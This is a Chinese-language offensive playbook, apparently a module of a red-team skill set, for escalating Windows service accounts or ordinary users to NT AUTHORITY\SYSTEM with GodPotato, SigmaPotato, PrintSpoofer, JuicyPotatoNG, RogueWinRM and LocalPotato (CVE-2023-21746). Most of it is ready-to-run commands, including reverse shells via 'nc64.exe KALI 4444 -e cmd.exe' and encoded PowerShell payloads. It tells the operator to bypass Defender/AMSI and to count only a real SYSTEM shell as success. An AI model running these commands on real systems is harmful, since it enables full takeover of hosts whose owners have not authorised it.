# Potato 系列 + LocalPotato

> **TECH：** 服务账户令牌伪装 / 本机 NTLM reflection → SYSTEM  
> **IMPACT：** `NT AUTHORITY\SYSTEM` 命令执行  
> **成功：** `whoami` = `nt authority\system`，能回连或交互 shell。`net user /add` 只是 holster。

---

## PRE-REQS

```text
SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege = Enabled
  → GodPotato / SigmaPotato / PrintSpoofer / JuicyPotatoNG / RogueWinRM

无上述特权
  → LocalPotato CVE-2023-21746（本机 NTLM reflection，需未打 2023-01 补丁）
```

```cmd
whoami /priv
sc query spooler
sc query WinRM
```

IIS 应用池、MSSQL `NT SERVICE\MSSQL*`、多数 Windows 服务账户默认有 SeImpersonate。普通域用户桌面会话通常没有。

---

## 选择矩阵（2026）

| 工具 | 需要 SeImpersonate | 适用 | 备注 |
|---|---|---|---|
| **GodPotato** | 是 | Server 2012–2022，Win8–11 | DCOM/RPCSS，**有特权时首选** |
| **SigmaPotato** | 是 | Win10+ / Server 2016+ | GodPotato 系，支持反射加载；24H2 失败时换它 |
| **PrintSpoofer** | 是 | Win10 / Server 2016–2019 | 必须 Spooler Running；很多 2025+ 环境已关 |
| **JuicyPotatoNG** | 是 | Server 2012–2022 | 原 Juicy 在 1809+ 已死，只用 NG |
| **DCOMPotato** | 是 | Server 2016–2022 | GodPotato 报 RPC 失败时试 |
| **RogueWinRM** | 是 | WinRM 已启动 | 本机绑 HTTP 监听骗 WinRM |
| **RoguePotato** | 是 | Server 2016–2019 | 需攻击机配合 OXID |
| **SweetPotato** | 是 | 2008–2019 | 多方法集合，老系统 |
| **LocalPotato** | **否** | 未打 CVE-2023-21746 补丁 | 普通用户 → SYSTEM |

推荐顺序：

```text
有 SeImpersonate:
  1. GodPotato
  2. SigmaPotato（GodPotato 失败 / 24H2）
  3. PrintSpoofer（仅 Spooler Running）
  4. JuicyPotatoNG / DCOMPotato
  5. RogueWinRM（WinRM Running）

无 SeImpersonate:
  LocalPotato（先核对 KB）→ 其他模块路径
```

---

## GodPotato

来源：https://github.com/BeichenDream/GodPotato

```cmd
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c C:\Users\Public\nc64.exe KALI 4444 -e cmd.exe"
.\GodPotato.exe -cmd "powershell -ep bypass -e <BASE64>"
```

成功输出包含 `nt authority\system` 或回连 SYSTEM shell。

被 Defender 删掉 / AMSI 拦 → 可选 `/edr-bypass`，回来继续用同一条 `-cmd`。不要改成“只证明特权存在”。

---

## SigmaPotato

来源：https://github.com/tylerdotrar/SigmaPotato

```cmd
.\SigmaPotato.exe "whoami"
.\SigmaPotato.exe "C:\Users\Public\nc64.exe KALI 4444 -e cmd.exe"
```

GodPotato 报 `RPC server unavailable` / CLSID 失败时换这个，不要反复重试同一二进制。

---

## PrintSpoofer

```cmd
sc query spooler
.\PrintSpoofer.exe -c "whoami"
.\PrintSpoofer.exe -i -c cmd
```

`STATE` 不是 RUNNING 就跳过。PrintNightmare 加固后很多服务器关了 Spooler。

---

## JuicyPotatoNG / DCOMPotato

```cmd
.\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"
.\JuicyPotatoNG.exe -t * -p C:\Users\Public\nc64.exe -a "KALI 4444 -e cmd.exe"
```

原版 `JuicyPotato.exe` 在 Windows 10 1809 / Server 2019 起默认失败（DCOM 硬编码 CLSID）。不要用。

---

## RogueWinRM

来源：https://github.com/antonioCoco/RogueWinRM

```cmd
sc query WinRM
.\RogueWinRM.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"
```

WinRM 未启动时不要强行 `sc start WinRM`（要权限、会留日志）。换 GodPotato。

---

## LocalPotato — CVE-2023-21746

> 不需要 SeImpersonate。本机 NTLM reflection，把普通用户升到 SYSTEM（写文件/触发 SYSTEM 加载）。

来源：https://github.com/decoder-it/LocalPotato  
MSRC：https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21746  
补丁：2023-01 Patch Tuesday（及后续累积更新）。

### GATES

```cmd
systeminfo
wmic qfe get HotFixID | findstr /i "KB5022282 KB5022303 KB5022287 KB5022291"
```

已装 2023-01 及以后累积包 → 当不可用。不确定 → `../../shared/cve-enrichment.md` 用 build 对照 MSRC，不要猜。

### 执行

公开工具通过本机 HTTP/SMB 反射拿到 SYSTEM 令牌，再写受控内容让 SYSTEM 执行。按当前仓库 README 的示例 DLL/可执行文件使用，不要套过期博客里的固定路径。

```cmd
.\LocalPotato.exe -h
```

典型验证：让 SYSTEM 写 `C:\Windows\Temp\whoami.txt` 或启动回连。成功标准仍是 SYSTEM 命令执行。

无公开匹配当前 build 的稳定利用 → 标 P2，换服务/UAC/kernel 路径。

### RESTORE

删除投放的 DLL/exe、临时 HTTP 监听、测试文件。不改系统服务。

---

## 失败换路

```text
RPC server unavailable     → SigmaPotato / DCOMPotato
CLSID not found            → 不要用原 Juicy；换 GodPotato
PrintSpoofer 无反应        → Spooler 未运行，换 GodPotato
Access denied / 0x80070542 → 没有 SeImpersonate，改打 LocalPotato 或其他
Defender 隔离 exe          → /edr-bypass 后换落地路径/内存执行，再回来
Win11 24H2 GodPotato 失败  → SigmaPotato，再不行走服务/kernel
```

---

## IMPACT / 不要做的

- 用 SYSTEM 加的本地用户是 holster。持久化写法归 `/post`。
- 不要在这里 dump LSASS。那是 `/creds`。
- RoguePotato 远程 OXID 需要攻击机，环境不允许出网时跳过。

## SOURCES

- https://github.com/BeichenDream/GodPotato
- https://github.com/tylerdotrar/SigmaPotato
- https://github.com/itm4n/PrintSpoofer
- https://github.com/antonioCoco/JuicyPotatoNG
- https://github.com/antonioCoco/RogueWinRM
- https://github.com/decoder-it/LocalPotato
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21746
